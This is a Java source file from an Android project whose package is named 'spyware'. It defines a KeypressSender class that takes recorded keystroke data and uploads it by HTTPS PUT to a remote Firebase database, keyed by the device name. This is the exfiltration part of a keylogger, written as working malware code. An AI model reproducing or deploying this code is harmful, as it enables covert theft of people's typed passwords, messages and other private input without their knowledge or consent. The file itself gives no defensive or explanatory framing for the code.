package com.example.cristianturetta.spyware;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;

public class KeypressSender {
   static private KeypressSender mInstance;

    private KeypressSender(){}

    public static KeypressSender getInstance(){
        if (mInstance == null){
            synchronized (KeypressSender.class){
                if (mInstance == null){
                    mInstance = new KeypressSender();
                }
            }
        }
        return mInstance;
    }


    public void sendRecordedData(String tosend){
        String result;
        InputStream inputStream;

        Random random = new Random();

        try {
            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL()+ "/keypress.json");
            HttpsURLConnection urlConnection = (HttpsURLConnection) databaseURL.openConnection();
            System.getProperty("os.version");

            urlConnection.setRequestMethod("PUT");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/json");
            urlConnection.setRequestProperty("Accept", "application/json");

            JSONObject jsonObject = new JSONObject();
            jsonObject.put(android.os.Build.DEVICE , tosend);
            setPostRequestContent(urlConnection, jsonObject);

            urlConnection.connect();
            Log.d("KeypressSender", "Firebase resp. code " + urlConnection.getResponseCode());

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void setPostRequestContent(HttpsURLConnection conn, JSONObject jsonObject) throws IOException {
        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
        writer.write(jsonObject.toString());
        writer.flush();
        writer.close();
        os.close();
    }

}
